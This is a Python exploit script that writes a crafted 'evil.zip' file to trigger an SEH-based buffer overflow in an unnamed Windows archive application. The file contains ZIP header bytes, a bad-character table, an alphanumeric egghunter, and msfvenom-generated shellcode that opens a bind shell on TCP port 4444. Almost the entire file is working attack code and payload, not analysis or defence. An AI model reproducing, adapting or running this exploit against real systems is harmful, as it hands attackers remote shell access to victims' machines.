#!/usr/bin/python

#####################################################
## WriTTen By: van6uard
## Dustin Silveri
## Tested on Windows Vista x86 Ultimate
##
##                        ________                      .___
## ___  _______    ____  /  _____/__ _______ _______  __| _/
## \  \/ /\__  \  /    \/   __  \|  |  \__  \\_  __ \/ __ | 
##  \   /  / __ \|   |  \  |__\  \  |  // __ \|  | \/ /_/ | 
##   \_/  (____  /___|  /\_____  /____/(____  /__|  \____ | 
##             \/     \/       \/           \/           \/
##
#####################################################


filename = "evil.zip"

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

## bad characters =
## \x5c \
## \x3a :
## \x0a NL

## Mangled
## \x2f --> 8c
## \x80 --> c7
## \x15 --> a7
## \x14 --> b6
## \x0f --> a4
## \x8f --> c5
## \x8e --> c4
## \x8d --> ec #
## \x8c --> ee
## \x8b --> ef
## \x8a --> e8
## \x89 --> eb #
## \x88 --> ea
## \x87 --> e7
## \x86 --> e5
## \x85 --> e0
## \x84 --> e4
## \x83 --> e2
## \x82 --> e9
## \x81 --> fc
## \xff --> a0
## \xfe --> a6
## \xfd --> b2
## \xfc --> 6e
## \xfb --> 76
## \xfa --> b7
## \xf9 --> b7
## \xf8 --> b0
## \xf7 --> 98
## \xf6 --> f7
## \xf5 --> 29
## \xf4 --> 28
## \xf3 --> 3d
## \xf2 --> 3d
## \xf1 --> b1
## \xf0 --> 3d
## \xef --> 6e
## \xee --> 65
## \xed --> 66
## \xec --> 38
## \xeb --> 64
## \xea --> 4f
## \xe9 --> 54
## \xe8 --> 46
## \xe7 --> 74
## \xe6 --> b5
## \xe5 --> 73
## \xe4 --> 53
## \xe3 --> 70
## \xe2 --> 47
## \xe1 --> df
## \xe0 --> 61
## \xc1 --> af
## \xc2 --> a6
## \xc3 --> a6
## \xc4 --> 5f
## \xc5 --> a6
## \xc6 --> 2b
## \xc7 --> 2b
## \xc8 --> 2b
## \xc9 --> 2b
## \xca --> 2b
## \xcb --> 2b
## \xcc --> 2b
## \xcd --> 2b
## \xce --> 2b
## \xcf --> 2d
## \xd0 --> 2d
## \xd1 --> 2d
## \xd2 --> 2d
## \xd3 --> 2b
## \xd4 --> 2d
## \xd5 --> a6
## \xd6 --> 2d
## \xd7 --> 2d
## \xd8 --> 2b
## \xd9 --> 2b
## \xda --> a6
## \xdb --> a6
## \xdc --> 2b
## \xdd --> 2d
## \xde --> 2b
## \xdf --> 2d
## \xe0 --> 2d
## \xa1 --> ed
## \xa2 --> f3
## \xa3 --> fa
## \xa4 --> f1
## \xa5 --> d1
## \xa6 --> aa
## \xa7 --> ba
## \xa8 --> bf
## \xa9 --> ac
## \xaa --> ac
## \xab --> bd
## \xac --> bc
## \xad --> a1
## \xae --> ab
## \xaf --> bb
## \xb0 --> a6
## \xb1 --> a6
## \xb2 --> a6
## \xb3 --> a6
## \xb4 --> a6
## \xb5 --> a6
## \xb6 --> a6
## \xb7 --> 2b
## \xb8 --> 2b
## \xb9 --> a6
## \xba --> a6
## \xbb --> 2b
## \xbc --> 2b
## \xbd --> 2b
## \xbe --> 2b
## \xbf --> 2b
## \xc0 --> 2b
## \x99 --> d6
## \x9a --> dc
## \x9b --> a2
## \x9c --> a3
## \x9d --> a5
## \x9e --> 50
## \x9f --> 83 #
## \xa0 --> e1
## \x95 --> f2
## \x96 --> fb
## \x97 --> f9
## \x98 --> ff
## \x91 --> e6
## \x92 --> c6
## \x90 --> c9
## \x93 --> f4
## \x94 --> f6

badchar = ""

# Good Characters: alpha numeric
# \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x10\x11\x12\x13\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20
# \x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e
# \x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x3f\x40
# \x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f\x60
# \x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f

alignment = "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x71\x58\x4e\x55\x2d\x71\x58\x4e\x55\x2d\x72\x5a\x50\x55\x50\x98\x85"

## msfvenom -p generic/custom PAYLOADFILE=egg.bin -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows
## Found 1 compatible encoders
## Attempting to encode payload with 1 iterations of x86/alpha_mixed
## x86/alpha_mixed succeeded with size 118 (iteration=0)
## x86/alpha_mixed chosen with final size 118
## Payload size: 118 bytes
## PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJICVnaxJKOtOPBbr3ZeRrx8MfNWLFe0ZQdHoLxPwDpdpPtLIXWLo1eKZloQeIwIoM7AA
egghunter = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJICVnaxJKOtOPBbr3ZeRrx8MfNWLFe0ZQdHoLxPwDpdpPtLIXWLo1eKZloQeIwIoM7AA"

## msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -a x86 --platform windows -f py -v shellcode
## Found 1 compatible encoders
## Attempting to encode payload with 1 iterations of x86/alpha_mixed
## x86/alpha_mixed succeeded with size 718 (iteration=0)
## x86/alpha_mixed chosen with final size 718
## Payload size: 718 bytes
## Final size of py file: 3848 bytes
shellcode =  ""
shellcode += "w00tw00t"
shellcode += "\x89\xe2\xda\xcd\xd9\x72\xf4\x58\x50\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x59\x6c\x69\x78\x6b\x32\x65\x50\x75\x50\x35\x50"
shellcode += "\x73\x50\x6f\x79\x59\x75\x76\x51\x79\x50\x61\x74"
shellcode += "\x6e\x6b\x42\x70\x44\x70\x4e\x6b\x61\x42\x44\x4c"
shellcode += "\x4c\x4b\x42\x72\x76\x74\x4e\x6b\x71\x62\x61\x38"
shellcode += "\x74\x4f\x6e\x57\x53\x7a\x34\x66\x56\x51\x39\x6f"
shellcode += "\x4c\x6c\x77\x4c\x31\x71\x71\x6c\x76\x62\x66\x4c"
shellcode += "\x47\x50\x6f\x31\x5a\x6f\x64\x4d\x67\x71\x48\x47"
shellcode += "\x6a\x42\x5a\x52\x72\x72\x66\x37\x4e\x6b\x50\x52"
shellcode += "\x66\x70\x6c\x4b\x72\x6a\x57\x4c\x6c\x4b\x62\x6c"
shellcode += "\x57\x61\x70\x78\x7a\x43\x70\x48\x53\x31\x6a\x71"
shellcode += "\x63\x61\x4e\x6b\x73\x69\x55\x70\x55\x51\x38\x53"
shellcode += "\x4c\x4b\x77\x39\x45\x48\x6b\x53\x34\x7a\x31\x59"
shellcode += "\x6e\x6b\x74\x74\x6c\x4b\x57\x71\x78\x56\x64\x71"
shellcode += "\x59\x6f\x6e\x4c\x6a\x61\x4a\x6f\x56\x6d\x76\x61"
shellcode += "\x48\x47\x46\x58\x49\x70\x30\x75\x49\x66\x66\x63"
shellcode += "\x73\x4d\x59\x68\x65\x6b\x33\x4d\x47\x54\x63\x45"
shellcode += "\x6a\x44\x76\x38\x6c\x4b\x42\x78\x57\x54\x77\x71"
shellcode += "\x4b\x63\x71\x76\x4c\x4b\x36\x6c\x42\x6b\x6c\x4b"
shellcode += "\x33\x68\x65\x4c\x55\x51\x6b\x63\x4e\x6b\x37\x74"
shellcode += "\x6c\x4b\x53\x31\x4e\x30\x6e\x69\x61\x54\x31\x34"
shellcode += "\x66\x44\x33\x6b\x43\x6b\x71\x71\x42\x79\x43\x6a"
shellcode += "\x33\x61\x59\x6f\x4b\x50\x31\x4f\x73\x6f\x31\x4a"
shellcode += "\x6c\x4b\x46\x72\x4a\x4b\x4c\x4d\x61\x4d\x70\x68"
shellcode += "\x70\x33\x77\x42\x55\x50\x63\x30\x33\x58\x53\x47"
shellcode += "\x71\x63\x30\x32\x53\x6f\x56\x34\x52\x48\x32\x6c"
shellcode += "\x62\x57\x57\x56\x37\x77\x49\x6f\x59\x45\x4d\x68"
shellcode += "\x6a\x30\x57\x71\x57\x70\x77\x70\x56\x49\x78\x44"
shellcode += "\x73\x64\x76\x30\x61\x78\x76\x49\x4f\x70\x70\x6b"
shellcode += "\x57\x70\x79\x6f\x5a\x75\x32\x4a\x76\x68\x32\x79"
shellcode += "\x52\x70\x39\x72\x4b\x4d\x63\x70\x42\x70\x67\x30"
shellcode += "\x70\x50\x45\x38\x6a\x4a\x76\x6f\x59\x4f\x49\x70"
shellcode += "\x6b\x4f\x69\x45\x6a\x37\x50\x68\x73\x32\x43\x30"
shellcode += "\x54\x51\x43\x6c\x6f\x79\x4b\x56\x32\x4a\x72\x30"
shellcode += "\x30\x56\x53\x67\x42\x48\x6b\x72\x59\x4b\x56\x57"
shellcode += "\x52\x47\x59\x6f\x38\x55\x42\x77\x55\x38\x6f\x47"
shellcode += "\x58\x69\x77\x48\x79\x6f\x59\x6f\x39\x45\x56\x37"
shellcode += "\x31\x78\x31\x64\x78\x6c\x47\x4b\x6b\x51\x4b\x4f"
shellcode += "\x68\x55\x61\x47\x6d\x47\x43\x58\x53\x45\x42\x4e"
shellcode += "\x32\x6d\x65\x31\x49\x6f\x68\x55\x31\x78\x42\x43"
shellcode += "\x52\x4d\x65\x34\x67\x70\x4b\x39\x39\x73\x36\x37"
shellcode += "\x43\x67\x43\x67\x56\x51\x6b\x46\x61\x7a\x45\x42"
shellcode += "\x63\x69\x52\x76\x7a\x42\x6b\x4d\x72\x46\x78\x47"
shellcode += "\x43\x74\x36\x44\x65\x6c\x43\x31\x37\x71\x4c\x4d"
shellcode += "\x73\x74\x31\x34\x34\x50\x39\x56\x33\x30\x57\x34"
shellcode += "\x66\x34\x42\x70\x30\x56\x61\x46\x63\x66\x62\x66"
shellcode += "\x53\x66\x62\x6e\x71\x46\x52\x76\x66\x33\x72\x76"
shellcode += "\x52\x48\x70\x79\x48\x4c\x45\x6f\x4d\x56\x49\x6f"
shellcode += "\x6a\x75\x4d\x59\x79\x70\x30\x4e\x51\x46\x72\x66"
shellcode += "\x49\x6f\x70\x30\x71\x78\x75\x58\x6c\x47\x75\x4d"
shellcode += "\x31\x70\x49\x6f\x6e\x35\x6d\x6b\x48\x70\x6e\x55"
shellcode += "\x6c\x62\x53\x66\x50\x68\x4d\x76\x4a\x35\x4f\x4d"
shellcode += "\x4d\x4d\x49\x6f\x4b\x65\x67\x4c\x47\x76\x73\x4c"
shellcode += "\x65\x5a\x6d\x50\x69\x6b\x69\x70\x32\x55\x74\x45"
shellcode += "\x4d\x6b\x61\x57\x42\x33\x31\x62\x52\x4f\x33\x5a"
shellcode += "\x45\x50\x56\x33\x4b\x4f\x6a\x75\x41\x41"


payload = ""
payload += "A"*10
payload += egghunter
payload += "B"*(1022-40-10-len(egghunter))
payload += alignment
payload += "C"*(40-len(alignment))
payload += "\x89\x99\x41\x41"                        # seh
payload += "\x39\x78\x47\x00"            # 0x00477839 pop pop ret
payload += "D"*1000
payload += shellcode
payload += "E"*(4064-4-4-1022-1000-len(shellcode))
payload += ".txt"




exploit = header_1 + payload + header_2 + payload + header_3

textfile = open(filename, 'w')
textfile.write(exploit)
textfile.close()

